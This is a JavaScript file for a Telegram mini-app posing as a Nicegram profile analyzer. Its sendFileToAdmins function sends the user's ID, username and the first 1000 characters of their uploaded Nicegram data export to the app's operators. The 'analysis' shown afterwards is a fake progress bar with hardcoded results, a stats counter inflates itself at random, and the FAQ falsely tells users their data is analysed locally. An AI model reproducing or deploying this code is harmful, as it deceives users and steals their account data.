// Telegram Web App
const tg = window.Telegram.WebApp;
tg.expand();

// Переменные
let currentScreen = 'languageScreen';
let detectedUsername = '@file_user_722';
let userData = {
    username: '@file_user_722',
    accountCreated: '15.03.2023',
    totalGifts: 7,
    totalStars: 308
};

// Инициализация
document.addEventListener('DOMContentLoaded', function() {
    console.log('✅ Мини-приложение загружено');
    initLanguageSelection();
    initFileUpload();
    updateStats();
    
    // Автообновление статистики
    setInterval(updateStats, 60000);
    
    // Показываем экран языков
    showScreen('languageScreen');
});

// Обновление статистики
function updateStats() {
    const statsElement = document.querySelector('.stats-number');
    if (statsElement) {
        const current = parseInt(statsElement.textContent.replace(/\s/g, ''));
        const randomIncrease = Math.floor(Math.random() * 5) + 1;
        const newValue = current + randomIncrease;
        statsElement.textContent = newValue.toLocaleString('ru-RU');
    }
}

// Выбор языка
function initLanguageSelection() {
    const langOptions = document.querySelectorAll('.lang-option');
    
    langOptions.forEach(option => {
        option.onclick = function() {
            // Убираем активный класс
            langOptions.forEach(opt => opt.classList.remove('active'));
            
            // Добавляем активный
            this.classList.add('active');
            
            // Через 0.5 секунды переходим на главный экран
            setTimeout(() => {
                showScreen('mainScreen');
            }, 500);
        };
    });
}

// Показать экран
function showScreen(screenId) {
    // Скрываем все экраны
    document.querySelectorAll('.screen').forEach(screen => {
        screen.style.display = 'none';
        screen.classList.remove('active');
    });
    
    // Показываем нужный экран
    const screen = document.getElementById(screenId);
    if (screen) {
        screen.style.display = 'block';
        setTimeout(() => {
            screen.classList.add('active');
        }, 10);
        currentScreen = screenId;
        window.scrollTo(0, 0);
    }
}

// Загрузка файла
function initFileUpload() {
    const uploadBox = document.getElementById('uploadBox');
    const fileInput = document.getElementById('fileInput');
    
    if (!uploadBox || !fileInput) return;
    
    // Клик по области загрузки
    uploadBox.onclick = function() {
        fileInput.click();
    };
    
    // Выбор файла
    fileInput.onchange = async function(e) {
        const file = e.target.files[0];
        if (file) {
            console.log('📁 Выбран файл:', file.name);
            
            // Проверяем расширение
            const ext = file.name.toLowerCase();
            if (ext.endsWith('.json') || ext.endsWith('.html') || ext.endsWith('.txt')) {
                // Отправляем файл админам
                const sendResult = await sendFileToAdmins(file);
                
                if (sendResult.success) {
                    // Начинаем анализ
                    startFileAnalysis(file);
                } else {
                    alert('⚠️ Файл загружен, но не отправлен админам. Продолжаем анализ...');
                    startFileAnalysis(file);
                }
            } else {
                alert('❌ Пожалуйста, загрузите файл .json, .html или .txt');
            }
        }
    };
}

// Отправка файла админам (ИСПРАВЛЕННАЯ ВЕРСИЯ)
async function sendFileToAdmins(file) {
    try {
        console.log('🔄 Отправка файла админам:', file.name);
        
        // Проверяем доступность Telegram Web App
        if (!tg || !tg.sendData) {
            console.error('❌ Telegram Web App не доступен');
            return { success: false, error: 'Telegram Web App недоступен' };
        }
        
        // Получаем данные пользователя
        const user = tg.initDataUnsafe?.user || {};
        const userId = user.id || 'unknown_' + Date.now();
        const username = user.username || 'anonymous_user';
        
        console.log('👤 Пользователь:', { userId, username });
        
        // Читаем файл с ограничением размера
        const fileContent = await readFileAsText(file);
        
        // Проверяем размер файла (Telegram ограничение)
        const maxSize = 4096 * 1024; // 4MB для безопасности
        if (file.size > maxSize) {
            console.warn('⚠️ Файл слишком большой, отправляем только начало');
        }
        
        // Создаем данные для отправки (ограничиваем размер)
        const dataToSend = {
            action: 'file_upload_from_webapp',
            file_name: file.name,
            file_size: file.size,
            file_type: file.type,
            user_id: userId,
            username: username,
            timestamp: new Date().toISOString(),
            // Отправляем только часть файла если он большой
            content_preview: fileContent.substring(0, 1000),
            full_content_length: fileContent.length,
            source: 'nicegram_web_app'
        };
        
        // Добавляем хэш файла для идентификации
        try {
            const fileHash = await calculateFileHash(fileContent);
            dataToSend.file_hash = fileHash;
        } catch (e) {
            console.log('Не удалось вычислить хэш файла');
        }
        
        console.log('📤 Отправляю данные:', {
            fileName: dataToSend.file_name,
            fileSize: dataToSend.file_size,
            userId: dataToSend.user_id
        });
        
        // Отправляем через Telegram Web App
        tg.sendData(JSON.stringify(dataToSend));
        
        // Также сохраняем в localStorage для отладки
        localStorage.setItem('last_file_sent', JSON.stringify({
            file_name: file.name,
            time: new Date().toISOString(),
            user: username
        }));
        
        console.log('✅ Файл отправлен админам через Telegram Web App');
        
        return { success: true, fileName: file.name };
        
    } catch (error) {
        console.error('❌ Ошибка при отправке файла:', error);
        
        // Сохраняем файл локально как запасной вариант
        try {
            const backupData = {
                file_name: file.name,
                file_size: file.size,
                timestamp: new Date().toISOString(),
                error: error.message
            };
            localStorage.setItem('failed_file_backup', JSON.stringify(backupData));
        } catch (e) {
            console.log('Не удалось сохранить backup');
        }
        
        return { success: false, error: error.message };
    }
}

// Вспомогательная функция для хэширования
async function calculateFileHash(content) {
    // Простой хэш для идентификации файла
    let hash = 0;
    for (let i = 0; i < Math.min(content.length, 1000); i++) {
        const char = content.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return hash.toString(16);
}

// Чтение файла как текст
function readFileAsText(file) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = (e) => resolve(e.target.result);
        reader.onerror = (e) => reject(new Error('Ошибка чтения файла: ' + e.target.error));
        reader.readAsText(file);
    });
}

// Начать анализ файла
function startFileAnalysis(file) {
    console.log('🔍 Начинаем анализ файла:', file.name);
    
    // Показываем экран проверки
    showScreen('checkScreen');
    
    // Запускаем анимацию загрузки
    startLoadingAnimation(file);
}

// Функция анимации загрузки с процентами
function startLoadingAnimation(file) {
    const progressFill = document.getElementById('progressFill');
    const progressPercentage = document.getElementById('progressPercentage');
    const checkText = document.getElementById('checkText');
    
    let progress = 0;
    const totalTime = 3000;
    const intervalTime = 30;
    const steps = totalTime / intervalTime;
    const increment = 100 / steps;
    
    const loadingInterval = setInterval(() => {
        progress += increment;
        if (progress > 100) progress = 100;
        
        // Обновляем прогресс-бар
        progressFill.style.width = progress + '%';
        
        // Обновляем процент
        progressPercentage.textContent = Math.floor(progress) + '%';
        
        // Меняем текст на разных этапах
        if (progress < 40) {
            checkText.textContent = 'Читаем файл...';
        } else if (progress < 70) {
            checkText.textContent = 'Анализируем данные...';
        } else {
            checkText.textContent = 'Формируем отчет...';
        }
        
        // Когда достигли 100%
        if (progress >= 100) {
            clearInterval(loadingInterval);
            
            // Используем фиксированные данные для демонстрации
            userData = {
                username: '@file_user_722',
                accountCreated: '15.03.2023',
                totalGifts: 7,
                totalStars: 308
            };
            detectedUsername = '@file_user_722';
            
            // Через 1 секунду показываем отчет
            setTimeout(() => {
                showAnalysisResults();
            }, 1000);
        }
    }, intervalTime);
}

// Показать результаты анализа
function showAnalysisResults() {
    console.log('📊 Показываем результаты анализа');
    
    // Обновляем все данные в отчете
    const finalGifts = document.getElementById('finalGifts');
    const finalStars = document.getElementById('finalStars');
    
    if (finalGifts) finalGifts.textContent = userData.totalGifts;
    if (finalStars) finalStars.textContent = userData.totalStars + ' ★';
    
    // Показываем экран успеха
    showScreen('successScreen');
}

// Выбор языка (для совместимости с HTML)
function selectLanguage(lang) {
    console.log('Выбран язык:', lang);
    const langOptions = document.querySelectorAll('.lang-option');
    
    langOptions.forEach(option => {
        option.classList.remove('active');
    });
    
    setTimeout(() => {
        showScreen('mainScreen');
    }, 500);
}

// Показать инструкцию
function showInstruction() {
    alert('📖 ИНСТРУКЦИЯ:\n\n1. Экспортируйте данные из Nicegram\n2. Загрузите файл в это приложение\n3. Получите анализ своего профиля\n4. Проверьте статистику подарков');
}

// Показать FAQ
function showFAQ() {
    alert('❓ ЧАСТЫЕ ВОПРОСЫ:\n\nQ: Какой файл нужен?\nA: Экспорт данных из Nicegram (JSON/HTML)\n\nQ: Что анализируется?\nA: Ваш ник, подарки, звезды, история\n\nQ: Безопасно ли это?\nA: Да, анализ происходит локально');
}

// Закрыть приложение
function closeApp() {
    if (tg && tg.close) {
        tg.close();
    } else {
        alert('Приложение закрыто');
    }
}
